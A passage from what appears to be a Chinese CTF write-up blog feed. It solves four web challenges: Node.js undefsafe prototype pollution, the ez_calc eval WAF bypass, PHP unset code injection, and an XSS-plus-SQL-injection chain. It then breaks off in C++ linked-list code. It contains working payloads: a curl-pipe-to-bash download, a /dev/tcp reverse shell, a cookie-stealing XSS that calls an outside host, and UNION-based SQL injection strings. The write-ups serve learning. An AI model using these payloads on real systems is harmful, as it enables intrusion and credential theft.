&#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 删除笔记路由</span><br><span class="line">app.route(&#x27;/delete_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;请使用POST方法删除笔记&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;  // 获取要删除的笔记ID</span><br><span class="line">        if (id) &#123;              // 验证ID存在</span><br><span class="line">            notes.remove_note(id);  // 调用删除方法</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;删除成功&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;删除失败&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 查看笔记路由</span><br><span class="line">app.route(&#x27;/notes&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;  // 获取查询参数</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;  // 判断是否查询特定笔记</span><br><span class="line">            a_note = notes.get_all_notes();  // 获取所有笔记</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);     // 获取指定笔记</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);  // 渲染笔记视图</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 系统状态路由（存在命令注入风险）</span><br><span class="line">app.route(&#x27;/status&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;  // 定义要执行的系统命令</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,   // 查看系统运行时间</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;    // 查看内存使用情况</span><br><span class="line">        &#125;;</span><br><span class="line">        // 遍历并执行所有命令</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);  // 打印命令输出</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);  // 返回响应</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 404错误处理中间件</span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">  res.status(404).send(&#x27;抱歉，找不到该页面！&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 500错误处理中间件</span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">  console.error(err.stack);  // 打印错误堆栈</span><br><span class="line">  res.status(500).send(&#x27;服务器出错！&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 启动服务器，监听8080端口</span><br><span class="line">const port = 8080;</span><br><span class="line">app.listen(port, () =&gt; console.log(`应用已启动，访问地址：http://localhost:$&#123;port&#125;`))</span><br></pre></td></tr></table></figure>

<p>又是nodejs题</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="undefsafe"><a href="#undefsafe" class="headerlink" title="undefsafe"></a>undefsafe</h3><p>之前遇到的都是merge函数导致的原型链污染</p>
<p>但undefsafe 模块也可以原型链污染。</p>
<p>undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。在版本小于2.0.3的<code>undefsafe</code>函数有漏洞，可以污染<strong>所有对象</strong>的原型链，给对象添加属性。</p>
<p>作用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var object = &#123;</span><br><span class="line">	a: &#123;b: [1,2,3]&#125;</span><br><span class="line">&#125;;</span><br><span class="line">var res = undefsafe(object, &#x27;a.b.0&#x27;, 10);</span><br><span class="line">console.log(object); // &#123; a: &#123; b: [10, 2, 3] &#125; &#125;</span><br><span class="line">//这里可以看见1被替换成了10</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var b = &#123;&#125;;</span><br><span class="line">var c = &#123;&#125;;</span><br><span class="line">var payload = &quot;__proto__.ddd&quot;;</span><br><span class="line">a(b,payload,&quot;JHU&quot;);</span><br><span class="line">console.log(c.ddd);</span><br></pre></td></tr></table></figure>

<p>污染原型链后，空对象多了个<code>ddd</code>属性，且<code>&#123;&#125;.ddd=JHU</code>。</p>
<p>漏洞具体：<a href="https://xianbeil.github.io/2022/03/14/undefsafeStudy/">Undefsafe模块原型链污染(CVE-2019-10795)</a></p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>回到题目</p>
<p><strong>&#x2F;status有命令执行函数</strong>，所以得想办法污染commands对象，例如令commads.a&#x3D;whoami，然后访问&#x2F;status它会遍历执行commands字典中的命令。</p>
<p><img src="/../images/20250523160111866.png" alt="image-20250523160111866"></p>
<p>在这里用到了undefsafe</p>
<p><img src="/../images/20250523160232975.png" alt="image-20250523160232975"></p>
<p>id，author,raw是我们可控的输入</p>
<p>我们就可以尝试进行污染：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=__proto__&amp;author=curl%20http://IP/shell.txt|bash&amp;raw=a</span><br></pre></td></tr></table></figure>

<p>shell.txt内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/IP/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>直接反弹shell</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>NodeJs</tag>
        <tag>JS原型链污染</tag>
        <tag>undefsafe导致原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>[GFCTF 2021]ez_calc</title>
    <url>/2025/05/23/%5BGFCTF%202021%5Dez_calc/</url>
    <content><![CDATA[<p>  <img src="/../images/20250523212816373.png" alt="image-20250523212816373"></p>
<p>题目界面如上</p>
<p>查看源码，划拉到最下面</p>
<p><img src="/../images/20250523212850473.png" alt="image-20250523212850473"></p>
<p>有提示，这里有个js大小写漏洞</p>
<p>主要函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。</span><br><span class="line">在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。</span><br></pre></td></tr></table></figure>

<p>输入<code>admın/admin123</code>，就可以成功登录进去了</p>
<p><img src="/../images/20250523213226598.png" alt="image-20250523213226598"></p>
<p>进去之后是一个类似计算器一样的</p>
<p>源码+注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 获取请求体中的calc参数值</span><br><span class="line">let calc = req.body.calc;</span><br><span class="line"></span><br><span class="line">// 初始化标志位，用于后续字符替换逻辑</span><br><span class="line">let flag = false;</span><br><span class="line"></span><br><span class="line">// WAF(Web应用防火墙)处理开始</span><br><span class="line">for (let i = 0; i &lt; calc.length; i++) &#123;</span><br><span class="line">    // 检查当前字符是否是敏感字符或者之前已经发现敏感字符(flag为true)</span><br><span class="line">    if (flag || &quot;/(flc&#x27;\&quot;.&quot;.split``.some(v =&gt; v == calc[i])) &#123;</span><br><span class="line">        // 设置标志位为true，表示发现敏感字符</span><br><span class="line">        flag = true;</span><br><span class="line">        // 将当前敏感字符替换为星号*</span><br><span class="line">        calc = calc.slice(0, i) + &quot;*&quot; + calc.slice(i + 1, calc.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 截取字符串，只保留前64个字符</span><br><span class="line">calc = calc.substring(0, 64);</span><br><span class="line"></span><br><span class="line">// 移除所有空白字符(包括空格、制表符、换行符等)</span><br><span class="line">calc = calc.replace(/\s+/g, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">// 将所有的反斜杠\替换为双反斜杠\\（转义处理）</span><br><span class="line">calc = calc.replace(/\\/g, &quot;\\\\&quot;);</span><br><span class="line"></span><br><span class="line">// 小明的同学添加的额外安全过滤</span><br><span class="line">// 循环移除所有&quot;sh&quot;字符串</span><br><span class="line">while (calc.indexOf(&quot;sh&quot;) &gt; -1) &#123;</span><br><span class="line">    calc = calc.replace(&quot;sh&quot;, &quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">// 循环移除所有&quot;ln&quot;字符串</span><br><span class="line">while (calc.indexOf(&quot;ln&quot;) &gt; -1) &#123;</span><br><span class="line">    calc = calc.replace(&quot;ln&quot;, &quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">// 循环移除所有&quot;fs&quot;字符串</span><br><span class="line">while (calc.indexOf(&quot;fs&quot;) &gt; -1) &#123;</span><br><span class="line">    calc = calc.replace(&quot;fs&quot;, &quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">// 循环移除所有&quot;x&quot;字符</span><br><span class="line">while (calc.indexOf(&quot;x&quot;) &gt; -1) &#123;</span><br><span class="line">    calc = calc.replace(&quot;x&quot;, &quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    // 尝试执行处理后的calc字符串作为JavaScript代码</span><br><span class="line">    result = eval(calc);</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    // 这里应该有错误处理代码，但示例中省略了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>慢慢审计一下</p>
<p>首先看最后有一个<code>eval</code>，应该是可以命令执行，但是它做了很多的过滤，正常<code>rce</code>的话肯定会触发<code>waf</code>，我们只有先看看它这个<code>waf</code>的逻辑，看看有没有绕过它的方法；首先它通过<code>split</code>会对输入的参数的每一位都会进行检查，如果出现了<code>/(flc&#39;\&quot;.</code>中的任意字符，就会将后面所有的字符都变成<code>*</code>，然后会将处理后的这个字符串进行截取操作，取前64位，在去除了空格，过滤了危险字符之后，传入<code>eval</code>中，看似非常完美的过滤，肯定是无法传入字符串了，但它忽略了一个问题就是，假如我们传入的不是字符串呢？我们知道在<code>PHP</code>中<strong>数组</strong>有很多神奇的操作可以绕过过滤，其实这里也可以尝试数组的，假如我们尝试传入数组<code>[&quot;aaaaa&quot;,&quot;bbbbb&quot;,ccccc]</code>，这样<code>calc[i]</code>就不再是单个的字符，而变成了一个字符串了；那么<code>calc.length</code>也就是数组中元素的个数，也就是3了；如果传入<code>[&quot;aaaaa&quot;,&quot;bbbbb&quot;,&quot;(&quot;,]</code>的话，那么按照这道题的逻辑，它在第3位发现了危险字符，那么就会将第三位以后的字符都替换成<code>*</code>，也就是处理成：<code>aaa***********</code>，而在数组中添加元素可以用<code>calc[]=aaaaa&amp;calc[]=bbbbb&amp;calc[]=ccccc</code>这种方式进行</p>
<p>那么假如说我们要让这个数组中的第一个五位字符的元素逃逸出来，我们就需要让数组的第五个元素中出现敏感字符，这样的话它就会让第五位以后的字符全变成<code>*</code>，而前五位字符就正常了；比如说像<code>[&quot;a(aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;,&quot;(&quot;]</code>，我们看看处理后它会变成什么样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc[]=a(aaa&amp;calc[]=bbb&amp;calc[]=ccc&amp;calc[]=d&amp;calc[]=(</span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250523214537923.png" alt="image-20250523214537923"></p>
<p>可以看到虽然说第一个元素中已经有了敏感元素<code>(</code>，但它还是被逃逸了出来，后续不触发waf的元素多了没有影响，所以说用这种方法就可以直接把我们要想要的字符串逃逸出来了</p>
<p>接下来我们就开始尝试构造<code>rce</code>的<code>payload</code>了，先来一个<code>ls /</code>，<code>payload</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<p><code>require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;/&#39;]).stdout.toString();是 Node.js 中用于执行系统命令 的代码，利用了 child_process 模块的 spawnSync 方法。</code></p>
<p><img src="/../images/20250523215122772.png" alt="image-20250523215122772"></p>
<p>发现flag，但想直接读取的话长度会不够</p>
<p>而且这里过滤了x，也无法直接利用<code>exec</code>，但是实际上这里是可以绕过的，因为我们通过<code>require</code>导入的模块是一个<code>Object</code>，那么就可以通过<code>Object.values</code>获取到<code>child_process</code>里面的各种方法，那么再通过数组下标<code>[5]</code>就可以得到<code>execSync</code>了，那么有了<code>execSync</code>后就可以通过写入文件的方式读取flag了，<code>payload</code>如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<p>遍历一下当前目录发现p已经成功写入，接下来读取p就行了，记得带上回显，用nl读就行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>Node.JS的rce</tag>
        <tag>JS字符串逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>[HFCTF2021 Quals]Unsetme</title>
    <url>/2025/05/28/%5BHFCTF2021%20Quals%5DUnsetme/</url>
    <content><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Kickstart the framework</span><br><span class="line">$f3=require(&#x27;lib/base.php&#x27;);   //引入base.php启动框架,并将框架实例赋值给$f3。</span><br><span class="line"></span><br><span class="line">$f3-&gt;set(&#x27;DEBUG&#x27;,1); //设置框架的DEBUG模式为启用</span><br><span class="line"></span><br><span class="line">if ((float)PCRE_VERSION&lt;8.0) </span><br><span class="line">    trigger_error(&#x27;PCRE version is out of date&#x27;); //检查PCRE(Perl兼容正则表达式)的版本是否低于8.0,如果低于则抛出错误。</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">unset($f3-&gt;$a); //使用unset()删除框架实例$f3上的属性$a</span><br><span class="line">$f3-&gt;run();  //运行框架</span><br></pre></td></tr></table></figure>

<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>通过调试a的值，设置pyload绕过unset函数从而执行我们的php代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=a%0a);phpinfo(</span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250528134656691.png" alt="image-20250528134656691"></p>
<p>成功绕过</p>
<p>读flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=test%0a);echo file_get_contents(%27/flag%27</span><br><span class="line">?a=test%0a);readfile(%27/flag%27</span><br><span class="line">?a=test%0a);system(%27cat%20/flag%27</span><br></pre></td></tr></table></figure>

<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>为什么要加%0a</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果?a=a);phpinfo(</span><br><span class="line">插入后的效果：</span><br><span class="line">unset($f3-&gt;a);phpinfo();</span><br></pre></td></tr></table></figure>

<p>这会导致PHP解释器将整行的字符当作unset的参数处理，导致语法错误。</p>
<p>加入换行符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset($f3-&gt;a</span><br><span class="line">);phpinfo();</span><br></pre></td></tr></table></figure>

<p>换行符将代码拆分成多个语句，PHP解释器就会判定换行前参数参数接受完毕，从而成功执行后续代码</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2019 华东北赛区]Web2</title>
    <url>/2025/05/26/eab11d7fe8d61bebe3b320d8d6287770_6238515a0f878d18667cb852f33eeaab_8/</url>
    <content><![CDATA[<p> 第一次在buu刷到xss的题目，这里我的vps已经到期了，复现不了了，简单记录一下做法吧</p>
<p>先扫一下目录，有以下界面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">admin.php</span><br><span class="line">login.php</span><br><span class="line">register.php</span><br><span class="line">post.php</span><br><span class="line">commitbug.php</span><br><span class="line">about.php</span><br></pre></td></tr></table></figure>

<p>admin.php:</p>
<p><img src="/../images/20250526162409073.png" alt="image-20250526162409073"></p>
<p>post.php:</p>
<p><img src="/../images/20250526162431408.png" alt="image-20250526162431408"></p>
<p>经测试，post.php的投稿处存在xss漏洞</p>
<p>现在解题思路清晰了</p>
<p><strong>构造xss-&gt;获取admin的cookie-&gt;登录admin.php</strong></p>
<p>但xss也有waf</p>
<p>这里记录一下大佬们是怎么做的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">投稿存在XSS，但是存在一些过滤，使用Markup</span><br><span class="line">转码，然后eval执行JS代码，并且需要一个window.location.href来自动触发刷新颜面</span><br><span class="line">使用题目提供的站内XSS平台</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250526162649924.png" alt="image-20250526162649924"></p>
<p>添加<code>windows.location.href</code>，并删去if判断那一段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=arHAGx&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>

<p>然后利用脚本，进行编码绕过，并且执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xss=&#x27;&#x27;&#x27;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=arHAGx&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();&#x27;&#x27;&#x27;</span><br><span class="line">output = &quot;&quot;</span><br><span class="line">for c in xss:</span><br><span class="line">    output += &quot;&amp;#&quot; + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</span><br></pre></td></tr></table></figure>

<p>执行之后把这些payload插入投稿</p>
<p>文章地址：<code>http://24175362-da9c-4f99-bb8d-110e10bfb9bf.node3.buuoj.cn/post/1b34bb5a26804f2410d6746d2129bb7b.html</code></p>
<p><img src="/../images/20250526162802083.png" alt="image-20250526162802083"></p>
<p>在反馈页面反馈，刚刚发布的那篇文章，使管理员去查看带有XSS的文章</p>
<p>然后后台xss平台就获取到管理员的cookie了</p>
<p>登录之后</p>
<p><img src="/../images/20250526162856867.png" alt="image-20250526162856867"></p>
<p>一个简单的sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-2 union select 1,2,3#</span><br><span class="line"></span><br><span class="line">-2 union select 1,database(),user()#</span><br><span class="line"></span><br><span class="line">-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ciscn&#x27;#</span><br><span class="line"></span><br><span class="line">-2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br><span class="line"></span><br><span class="line">-2 union select 1,2,group_concat(flagg) from ciscn.flag#</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>小王子单链表（蓝桥1110）</title>
    <url>/2025/06/02/%E5%B0%8F%E7%8E%8B%E5%AD%90%E5%8D%95%E9%93%BE%E8%A1%A8%EF%BC%88%E8%93%9D%E6%A1%A51110%EF%BC%89/</url>
    <content><![CDATA[<h1 id="小王子单链表（蓝桥1110）"><a href="#小王子单链表（蓝桥1110）" class="headerlink" title="小王子单链表（蓝桥1110）"></a>小王子单链表（蓝桥1110）</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">LNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">LNode</span> *next;</span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList</span><span class="params">(LinkList &amp;L)</span></span>&#123;</span><br><span class="line">  L=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(L==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertNextNode</span><span class="params">(LNode *p,<span class="type">int</span> e)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(p==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s-&gt;data=e;</span><br><span class="line">  s-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=s;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertX</span><span class="params">(LinkList L,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s=L;</span><br><span class="line">  LNode *t;</span><br><span class="line">  <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(s!=<span class="literal">NULL</span>&amp;&amp;s-&gt;next-&gt;data!=x)&#123;</span><br><span class="line">    i++;</span><br><span class="line">    s=s-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  t=s-&gt;next;</span><br><span class="line">  s-&gt;next=s-&gt;next-&gt;next;</span><br><span class="line">  t-&gt;next=L-&gt;next;</span><br><span class="line">  L-&gt;next=t;</span><br><span class="line">  <span class="comment">//t=L-&gt;next-&gt;data;</span></span><br><span class="line">  <span class="comment">//L-&gt;next-&gt;data=s-&gt;data;</span></span><br><span class="line">  <span class="comment">//s-&gt;data=t;</span></span><br><span class="line"> <span class="comment">// free(s);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">printLink</span><span class="params">(LinkList L)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s=L;</span><br><span class="line">  <span 